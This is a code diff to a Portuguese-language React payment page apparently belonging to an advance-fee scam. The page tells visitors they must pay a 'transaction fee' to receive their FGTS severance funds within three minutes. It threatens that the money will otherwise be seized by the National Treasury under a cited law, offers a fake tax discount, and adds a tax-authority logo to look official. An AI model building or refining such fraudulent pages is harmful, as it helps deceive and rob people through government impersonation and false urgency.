@@ -10,6 +10,7 @@ import { useNavigate } from "react-router-dom";
 import { FaAngleRight } from "react-icons/fa";
 import dayjs from "dayjs";
 import logobranco from "../assets/unnamed.png"
+import receita from "../assets/receita.png"
 
 export function PagamentoTarifa() {
 
@@ -160,9 +161,12 @@ export function PagamentoTarifa() {
                         <h2 className="text-3xl font-bold text-red-500">ATENÇÃO!</h2>
                     </div>
 
-                    <h2 className="text-xl text-center text-red-600">Caso não saque o dinheiro hoje, essa quantia será imediatamente bloqueado e disponibilizado ao <span className="font-bold">Tesouro Nacional</span> conforme lei 1.847/24 </h2>
+                    <h2 className="text-xl text-center text-red-600">Caso não saque o dinheiro hoje, essa quantia será imediatamente bloqueada e disponibilizada ao <span className="font-bold">Tesouro Nacional</span> conforme lei 1.847/24 </h2>
+
+                    <img src={receita} alt="receita" width={140} />
 
                     <div className="text-2xl font-thin text-center text-gray-700 mt-2">
+                        <img src="" alt="" />
                         Aguardando pagamento da <span className="text-primary">Tarifa Transacional</span>
                     </div>
                     {/* <p className="text-gray-600 text-center">
@@ -179,6 +183,7 @@ export function PagamentoTarifa() {
 
                     <div className="text-center space-y-2">
                         <h3 className="text-lg font-thin text-zinc-700">
+
                             Pague a tarifa para receber seu FGTS em até <span className="text-green-600 font-semibold">3 minutos!</span>
                         </h3>
                         <p className="text-gray-600">70% de desconto no imposto:</p>
